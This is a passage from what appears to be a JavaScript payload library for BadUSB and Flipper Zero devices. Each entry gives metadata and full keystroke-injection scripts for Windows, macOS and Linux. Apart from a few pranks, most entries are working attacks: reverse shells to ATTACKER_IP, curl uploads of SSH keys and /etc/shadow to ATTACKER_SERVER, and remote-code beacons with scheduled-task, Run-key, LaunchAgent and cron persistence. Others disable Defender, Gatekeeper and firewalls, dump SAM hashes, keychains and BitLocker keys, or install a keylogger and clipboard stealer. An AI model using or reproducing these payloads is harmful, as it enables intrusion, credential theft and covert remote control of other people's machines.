GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$d = New-Object -ComObject Shell.Application; for($i=0;$i -lt 10;$i++){ $d.Namespace(17).Items() | Where-Object { $_.Type -eq 'CD Drive' } | ForEach-Object { $_.InvokeVerb('Eject') }; Start-Sleep 2; $d.Namespace(17).Items() | Where-Object { $_.Type -eq 'CD Drive' } | ForEach-Object { $_.InvokeVerb('Eject') }; Start-Sleep 2 }"
ENTER`,
    notes: 'Only works if target has a physical CD/DVD drive.'
  },
  {
    id: 'prank-caps-toggle',
    name: 'Caps Lock Chaos',
    category: 'pranks',
    description: 'Randomly toggles Caps Lock every few seconds, making typing unpredictable.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~2s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Caps Lock Chaos
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$wsh = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 3 -Max 15); $wsh.SendKeys('{CAPSLOCK}') }"
ENTER`,
    notes: 'Runs indefinitely. Very subtle and confusing.'
  },
  {
    id: 'prank-desktop-screenshot',
    name: 'Fake Desktop Freeze',
    category: 'pranks',
    description: 'Takes a screenshot of the desktop, sets it as wallpaper, then hides all icons and taskbar.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Fake Desktop Freeze
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height); [System.Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save("$env:TEMP\\fake_desktop.bmp"); Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport("user32.dll")]static extern int SystemParametersInfo(int a,int b,string c,int d);public static void Set(string p){SystemParametersInfo(20,0,p,3);}}'; [W]::Set("$env:TEMP\\fake_desktop.bmp")
ENTER
DELAY 1000
STRING $toggleDesktop = New-Object -ComObject Shell.Application; $toggleDesktop.ToggleDesktop()
ENTER
STRING exit
ENTER`,
    notes: 'Makes it look like the desktop is frozen. Icons seem unclickable because they are just an image.'
  },

  // ==================== FLIPPER ZERO BADUSB ====================
  // Windows Flipper payloads
  {
    id: 'flipper-wifi-grab-sd',
    name: '[Flipper] WiFi Password Grabber to SD',
    category: 'credentials',
    description: 'Extracts all stored WiFi passwords via PowerShell and saves them to the Flipper Zero SD card via a mounted drive.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero WiFi Password Grabber
REM Saves output to Flipper SD card
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $profiles = netsh wlan show profiles | Select-String "\\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }; $results = @(); foreach($p in $profiles){ $detail = netsh wlan show profile name="$p" key=clear; $key = ($detail | Select-String "Key Content\\W+\\:(.+)$").Matches.Groups[1].Value.Trim(); $results += "$p : $key" }; $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; if($drv){ $results | Out-File "$($drv):\\loot\\wifi_passwords.txt" } else { $results | Out-File "$env:TEMP\\wifi_passwords.txt" }
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'flipper-sysinfo-sd',
    name: '[Flipper] System Info Exfil to SD',
    category: 'recon',
    description: 'Gathers comprehensive system info and writes it directly to the Flipper Zero SD card for offline retrieval.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero System Info Exfiltration
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $info = @(); $info += "=== COMPUTER NAME: $env:COMPUTERNAME ==="; $info += "=== USER: $env:USERNAME ==="; $info += (systeminfo | Out-String); $info += "=== NETWORK ==="; $info += (ipconfig /all | Out-String); $info += "=== USERS ==="; $info += (net user | Out-String); $info += "=== INSTALLED SOFTWARE ==="; $info += (Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion | Out-String); $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; $outPath = if($drv){"$($drv):\\loot\\sysinfo.txt"} else {"$env:TEMP\\sysinfo.txt"}; $info | Out-File $outPath
ENTER
DELAY 5000
STRING exit
ENTER`
  },
  {
    id: 'flipper-revshell-ps',
    name: '[Flipper] PowerShell Reverse Shell',
    category: 'reverse-shells',
    description: 'Flipper Zero BadUSB payload that opens a reverse PowerShell shell to the attacker with WAIT_FOR_BUTTON_PRESS for timing control.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero Reverse Shell
REM Press Flipper button when target is unlocked and unattended
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
DELAY 500
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
ENTER
DELAY 1000
STRING $c = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444); $s = $c.GetStream(); [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){ $d = (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i); $r = (iex $d 2>&1 | Out-String); $r2 = $r + "PS " + (pwd).Path + "> "; $sb = ([text.encoding]::ASCII).GetBytes($r2); $s.Write($sb,0,$sb.Length); $s.Flush() }; $c.Close()
ENTER`,
    notes: 'Replace ATTACKER_IP. Uses WAIT_FOR_BUTTON_PRESS for operator-controlled timing.'
  },
  {
    id: 'flipper-disable-defender',
    name: '[Flipper] Disable Windows Defender',
    category: 'evasion',
    description: 'Uses Flipper Zero to disable Windows Defender real-time protection with HOLD/RELEASE for reliable key combos.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero - Disable Windows Defender
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2'"
ENTER
DELAY 1500
REM Accept UAC prompt
ALT y
DELAY 3000`,
    notes: 'Requires admin. Tamper Protection may block on newer Windows builds.'
  },
  {
    id: 'flipper-create-admin',
    name: '[Flipper] Create Hidden Admin User',
    category: 'persistence',
    description: 'Creates a hidden administrator user account via Flipper Zero BadUSB for persistent access.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero - Create Hidden Admin User
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command net user SvcAdmin P@ssw0rd123! /add; net localgroup administrators SvcAdmin /add; reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v SvcAdmin /t REG_DWORD /d 0 /f'"
ENTER
DELAY 1500
ALT y
DELAY 3000`,
    notes: 'Creates user "SvcAdmin" hidden from login screen. Requires admin/UAC bypass.'
  },
  {
    id: 'flipper-sam-dump',
    name: '[Flipper] SAM Hash Dump',
    category: 'credentials',
    description: 'Dumps SAM database hashes using reg save and copies them to a retrievable location. Uses HOLD/RELEASE for reliability.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~12s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero SAM Hash Dump
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command reg save HKLM\\SAM C:\\Users\\Public\\sam.save /y; reg save HKLM\\SYSTEM C:\\Users\\Public\\system.save /y; reg save HKLM\\SECURITY C:\\Users\\Public\\security.save /y'"
ENTER
DELAY 1500
ALT y
DELAY 5000`,
    notes: 'Requires admin. Extract hashes offline with secretsdump.py or mimikatz.'
  },
  {
    id: 'flipper-browser-creds',
    name: '[Flipper] Browser Credential Harvester',
    category: 'credentials',
    description: 'Harvests saved browser credentials from Chrome and Edge, saves to Flipper SD or temp directory.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~15s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero Browser Credential Harvester
DEFAULT_DELAY 20
STRINGDELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $chromePath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"; $edgePath = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"; $dest = "$env:TEMP\\browser_loot"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; if(Test-Path $chromePath){ Copy-Item $chromePath "$dest\\chrome_logins.db" -Force }; if(Test-Path $edgePath){ Copy-Item $edgePath "$dest\\edge_logins.db" -Force }; $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; if($drv){ Copy-Item "$dest\\*" "$($drv):\\loot\\" -Force }
ENTER
DELAY 5000
STRING exit
ENTER`,
    notes: 'Copies encrypted login databases. Decrypt offline with tools like LaZagne.'
  },
  {
    id: 'flipper-keylogger',
    name: '[Flipper] Keylogger Installer',
    category: 'credentials',
    description: 'Deploys a lightweight PowerShell keylogger that logs keystrokes to a hidden file. Uses WAIT_FOR_BUTTON_PRESS.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'hard',
    format: 'flipper',
    script: `REM Flipper Zero Keylogger Deployment
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $code = '$api = Add-Type -MemberDefinition ''[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);'' -Name "KL" -PassThru; $logFile = "$env:APPDATA\\svchost.log"; while($true){ for($i=8;$i -le 190;$i++){ if($api::GetAsyncKeyState($i) -eq -32767){ $key = [System.Enum]::GetName([System.Windows.Forms.Keys],$i); $ts = Get-Date -Format "HH:mm:ss"; "$ts : $key" | Out-File $logFile -Append }}; Start-Sleep -Milliseconds 40}'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell -ArgumentList "-WindowStyle Hidden -EncodedCommand $encoded" -WindowStyle Hidden
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Keystrokes logged to %APPDATA%\\svchost.log. Runs until process killed.'
  },
  {
    id: 'flipper-screenshot-exfil',
    name: '[Flipper] Screenshot + Exfil',
    category: 'exfiltration',
    description: 'Captures a screenshot and saves it to the Flipper Zero SD card for physical retrieval.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero Screenshot Capture to SD
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; $path = if($drv){"$($drv):\\loot\\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"} else {"$env:TEMP\\screenshot.png"}; $bitmap.Save($path)
ENTER
DELAY 3000
STRING exit
ENTER`
  },
  {
    id: 'flipper-ransomware-sim',
    name: '[Flipper] Ransomware Simulator (Educational)',
    category: 'pranks',
    description: 'Educational ransomware simulation - renames files on the Desktop with .encrypted extension. Files can be restored by removing the extension.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero Ransomware Simulator (EDUCATIONAL ONLY)
REM Only renames files - does NOT encrypt anything
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $desktop = [Environment]::GetFolderPath("Desktop"); Get-ChildItem $desktop -File | Where-Object { $_.Extension -ne ".encrypted" } | ForEach-Object { Rename-Item $_.FullName "$($_.FullName).encrypted" }; $note = "YOUR FILES HAVE BEEN ENCRYPTED (not really - this is a simulation)\`nTo restore: remove the .encrypted extension from each file\`nThis was a security awareness demonstration."; $note | Out-File "$desktop\\RANSOM_NOTE.txt"; Start-Process notepad "$desktop\\RANSOM_NOTE.txt"
ENTER
DELAY 2000
STRING exit
ENTER`,
    notes: 'EDUCATIONAL ONLY. Simply renames files. Restore by removing .encrypted extension.'
  },
  {
    id: 'flipper-bitlocker-key',
    name: '[Flipper] BitLocker Key Extractor',
    category: 'credentials',
    description: 'Extracts BitLocker recovery keys from the system and saves to Flipper SD card.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero BitLocker Key Extractor
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI r
DELAY 500
STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command $keys = (Get-BitLockerVolume | Select-Object -ExpandProperty KeyProtector | Where-Object { $_.KeyProtectorType -eq \"RecoveryPassword\" } | Select-Object -ExpandProperty RecoveryPassword); $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq \"Flipper SD\" }).DriveLetter; $out = if($drv){\"$($drv):\\loot\\bitlocker_keys.txt\"} else {\"$env:TEMP\\bitlocker_keys.txt\"}; $keys | Out-File $out'"
ENTER
DELAY 1500
ALT y
DELAY 3000`,
    notes: 'Requires admin privileges. Only works if BitLocker is enabled on the system.'
  },
  {
    id: 'flipper-netshare-map',
    name: '[Flipper] Network Share Mapper',
    category: 'recon',
    description: 'Discovers and maps all accessible network shares, saving results to Flipper SD card.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~15s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero Network Share Mapper
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = @(); $out += "=== MAPPED DRIVES ==="; $out += (net use | Out-String); $out += "=== LOCAL SHARES ==="; $out += (net share | Out-String); $out += "=== NETWORK NEIGHBORS ==="; $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress -replace '\\d+$',''; 1..254 | ForEach-Object { $ip = "$subnet$_"; if(Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1){ $shares = net view "\\\\$ip" 2>$null; if($shares){ $out += "=== $ip ==="; $out += ($shares | Out-String) }}}; $drv = (Get-Volume | Where-Object { $_.FileSystemLabel -eq 'Flipper SD' }).DriveLetter; $outPath = if($drv){"$($drv):\\loot\\network_shares.txt"} else {"$env:TEMP\\network_shares.txt"}; $out | Out-File $outPath
ENTER
DELAY 10000
STRING exit
ENTER`
  },
  {
    id: 'flipper-clipboard-steal',
    name: '[Flipper] Clipboard Stealer',
    category: 'exfiltration',
    description: 'Continuously monitors and logs clipboard contents to Flipper SD card using DEFAULT_DELAY and STRINGDELAY.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~5s',
    detectionDifficulty: 'hard',
    format: 'flipper',
    script: `REM Flipper Zero Clipboard Stealer
DEFAULT_DELAY 20
STRINGDELAY 15
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $logFile = "$env:APPDATA\\cliplog.txt"; $last = ""; while($true){ $current = Get-Clipboard -Raw -ErrorAction SilentlyContinue; if($current -and $current -ne $last){ $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; "$ts\`n$current\`n---" | Out-File $logFile -Append; $last = $current }; Start-Sleep -Seconds 2 }
ENTER`,
    notes: 'Runs continuously logging clipboard changes. Kill powershell process to stop.'
  },
  {
    id: 'flipper-usb-dropper',
    name: '[Flipper] USB Autorun Payload Dropper',
    category: 'persistence',
    description: 'Drops a payload script and creates persistence via scheduled task. Uses HOLD/RELEASE for modifier keys.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero USB Payload Dropper
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $payloadDir = "C:\\Users\\Public\\Libraries"; New-Item -ItemType Directory -Force -Path $payloadDir | Out-Null; $payload = 'IEX(New-Object Net.WebClient).DownloadString("https://ATTACKER_SERVER/payload.ps1")'; $payload | Out-File "$payloadDir\\updater.ps1" -Encoding ASCII; $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $payloadDir\\updater.ps1"; $trigger = New-ScheduledTaskTrigger -AtLogon; Register-ScheduledTask -TaskName "WindowsLibraryUpdate" -Action $action -Trigger $trigger -Description "Windows Library Updater" -Force
ENTER
DELAY 3000
STRING exit
ENTER`,
    notes: 'Replace ATTACKER_SERVER. Payload persists via scheduled task at logon.'
  },
  {
    id: 'flipper-registry-persist',
    name: '[Flipper] Registry Persistence',
    category: 'persistence',
    description: 'Adds a registry Run key for persistence and drops a beacon script. Uses Flipper-specific STRINGDELAY for reliability.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero Registry Persistence
DEFAULT_DELAY 20
STRING_DELAY 15
WAIT_FOR_BUTTON_PRESS
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $script = '$w=New-Object Net.WebClient;while($true){try{IEX($w.DownloadString("https://ATTACKER_SERVER/beacon"))}catch{};Start-Sleep 300}'; $script | Out-File "C:\\Users\\Public\\updchk.ps1" -Encoding ASCII; New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "UpdateCheck" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\updchk.ps1" -PropertyType String -Force
ENTER
DELAY 2000
STRING exit
ENTER`,
    notes: 'Replace ATTACKER_SERVER. Beacon checks in every 5 minutes.'
  },

  // macOS Flipper payloads
  {
    id: 'flipper-mac-revshell',
    name: '[Flipper] macOS Terminal Reverse Shell',
    category: 'reverse-shells',
    description: 'Opens Terminal on macOS and establishes a reverse shell. Uses WAIT_FOR_BUTTON_PRESS for timing.',
    targetOS: ['macos'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero macOS Reverse Shell
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1500
STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
ENTER
DELAY 500
STRING disown && exit
ENTER`,
    notes: 'Replace ATTACKER_IP. Uses Spotlight to launch Terminal.'
  },
  {
    id: 'flipper-mac-sshkey-exfil',
    name: '[Flipper] macOS SSH Key Exfiltration',
    category: 'credentials',
    description: 'Copies SSH keys from the macOS user .ssh directory and uploads them or stages for retrieval.',
    targetOS: ['macos'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero macOS SSH Key Exfiltration
DEFAULT_DELAY 20
DELAY 1000
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1500
STRING mkdir -p /tmp/.loot && cp -r ~/.ssh/* /tmp/.loot/ 2>/dev/null; ls -la /tmp/.loot/ > /tmp/.loot/inventory.txt; curl -X POST -F "files=@/tmp/.loot/id_rsa" -F "files=@/tmp/.loot/id_ed25519" https://ATTACKER_SERVER/upload 2>/dev/null; exit
ENTER`,
    notes: 'Replace ATTACKER_SERVER. Attempts to upload common key types.'
  },
  {
    id: 'flipper-mac-keychain',
    name: '[Flipper] macOS Keychain Dump',
    category: 'credentials',
    description: 'Dumps keychain items including passwords and certificates from the macOS login keychain.',
    targetOS: ['macos'],
    riskLevel: 'critical',
    executionTime: '~10s',
    detectionDifficulty: 'hard',
    format: 'flipper',
    script: `REM Flipper Zero macOS Keychain Dump
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1500
STRING security dump-keychain -d ~/Library/Keychains/login.keychain-db > /tmp/.keychain_dump.txt 2>&1; security find-generic-password -ga "Wi-Fi" 2>&1 | grep password >> /tmp/.keychain_dump.txt; exit
ENTER`,
    notes: 'May prompt for user password on macOS. Security prompts cannot be bypassed.'
  },
  {
    id: 'flipper-mac-screenshot',
    name: '[Flipper] macOS Screenshot Capture',
    category: 'exfiltration',
    description: 'Takes a screenshot on macOS and stages it for exfiltration via curl.',
    targetOS: ['macos'],
    riskLevel: 'medium',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero macOS Screenshot
DEFAULT_DELAY 20
DELAY 1000
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1500
STRING screencapture -x /tmp/.ss_$(date +%s).png && curl -X POST -F "file=@$(ls -t /tmp/.ss_* | head -1)" https://ATTACKER_SERVER/upload 2>/dev/null; rm /tmp/.ss_*; exit
ENTER`,
    notes: 'Replace ATTACKER_SERVER. The -x flag suppresses the shutter sound.'
  },
  {
    id: 'flipper-mac-launchagent',
    name: '[Flipper] macOS LaunchAgent Persistence',
    category: 'persistence',
    description: 'Creates a macOS LaunchAgent for persistent reverse shell access. Uses STRINGDELAY for reliable typing.',
    targetOS: ['macos'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero macOS LaunchAgent Persistence
DEFAULT_DELAY 20
STRINGDELAY 15
DELAY 1000
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1500
STRING mkdir -p ~/Library/LaunchAgents && cat > ~/Library/LaunchAgents/com.apple.updatecheck.plist << 'PEOF'
ENTER
STRING <?xml version="1.0" encoding="UTF-8"?>
ENTER
STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
ENTER
STRING <plist version="1.0"><dict><key>Label</key><string>com.apple.updatecheck</string><key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>600</integer></dict></plist>
ENTER
STRING PEOF
ENTER
DELAY 500
STRING launchctl load ~/Library/LaunchAgents/com.apple.updatecheck.plist && exit
ENTER`,
    notes: 'Replace ATTACKER_IP. Reconnects every 10 minutes.'
  },
  {
    id: 'flipper-mac-disable-gatekeeper',
    name: '[Flipper] Disable macOS Gatekeeper',
    category: 'evasion',
    description: 'Disables macOS Gatekeeper to allow unsigned applications to run without warnings.',
    targetOS: ['macos'],
    riskLevel: 'high',
    executionTime: '~6s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero Disable macOS Gatekeeper
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER
DELAY 1500
STRING sudo spctl --master-disable
ENTER
DELAY 2000
REM User password may be required here
STRING sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO
ENTER
DELAY 1000
STRING exit
ENTER`,
    notes: 'Requires sudo password. Disables Gatekeeper and prevents auto-rearm.'
  },

  // Linux Flipper payloads
  {
    id: 'flipper-linux-revshell',
    name: '[Flipper] Linux Bash Reverse Shell',
    category: 'reverse-shells',
    description: 'Opens a terminal on Linux and establishes a bash reverse shell. Uses WAIT_FOR_BUTTON_PRESS.',
    targetOS: ['linux'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero Linux Reverse Shell
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
HOLD CTRL ALT
DELAY 100
STRING t
RELEASE CTRL ALT
DELAY 1500
STRING nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
ENTER
DELAY 500
STRING disown && exit
ENTER`,
    notes: 'Replace ATTACKER_IP. Uses HOLD/RELEASE for Ctrl+Alt+T terminal shortcut.'
  },
  {
    id: 'flipper-linux-shadow',
    name: '[Flipper] Linux /etc/shadow Copy',
    category: 'credentials',
    description: 'Copies /etc/shadow file for offline password cracking. Requires root or sudo access.',
    targetOS: ['linux'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero /etc/shadow Exfiltration
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
HOLD CTRL ALT
DELAY 100
STRING t
RELEASE CTRL ALT
DELAY 1500
STRING sudo cp /etc/shadow /tmp/.shadow_dump && sudo cp /etc/passwd /tmp/.passwd_dump && sudo chmod 644 /tmp/.shadow_dump /tmp/.passwd_dump && curl -X POST -F "shadow=@/tmp/.shadow_dump" -F "passwd=@/tmp/.passwd_dump" https://ATTACKER_SERVER/upload 2>/dev/null; rm /tmp/.shadow_dump /tmp/.passwd_dump; exit
ENTER`,
    notes: 'Replace ATTACKER_SERVER. Requires sudo. Crack with hashcat or john.'
  },
  {
    id: 'flipper-linux-sshkeys',
    name: '[Flipper] Linux SSH Authorized Keys Injection',
    category: 'persistence',
    description: 'Injects an attacker SSH public key into authorized_keys for persistent SSH access.',
    targetOS: ['linux'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero SSH Key Injection
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
HOLD CTRL ALT
DELAY 100
STRING t
RELEASE CTRL ALT
DELAY 1500
STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh && echo "ssh-rsa AAAA_ATTACKER_PUBLIC_KEY_HERE attacker@c2" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && exit
ENTER`,
    notes: 'Replace AAAA_ATTACKER_PUBLIC_KEY_HERE with your actual public key.'
  },
  {
    id: 'flipper-linux-crontab',
    name: '[Flipper] Linux Crontab Persistence',
    category: 'persistence',
    description: 'Adds a cron job for persistent reverse shell access every 5 minutes.',
    targetOS: ['linux'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    script: `REM Flipper Zero Linux Crontab Persistence
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
HOLD CTRL ALT
DELAY 100
STRING t
RELEASE CTRL ALT
DELAY 1500
STRING (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab - && echo "Persistence installed" && exit
ENTER`,
    notes: 'Replace ATTACKER_IP. Visible via crontab -l.'
  },
  {
    id: 'flipper-linux-iptables',
    name: '[Flipper] Linux iptables Disable',
    category: 'network',
    description: 'Flushes all iptables rules to disable the firewall. Uses HOLD/RELEASE for terminal shortcut.',
    targetOS: ['linux'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    script: `REM Flipper Zero Linux iptables Disable
DEFAULT_DELAY 20
WAIT_FOR_BUTTON_PRESS
HOLD CTRL ALT
DELAY 100
STRING t
RELEASE CTRL ALT
DELAY 1500
STRING sudo iptables -F && sudo iptables -X && sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT && sudo iptables -P OUTPUT ACCEPT && echo "Firewall disabled" && exit
ENTER`,
    notes: 'Requires sudo. Flushes all chains and sets default ACCEPT policy.'
  },

  // Cross-platform / Fun Flipper payloads
  {
    id: 'flipper-rickroll',
    name: '[Flipper] Rick Roll',
    category: 'pranks',
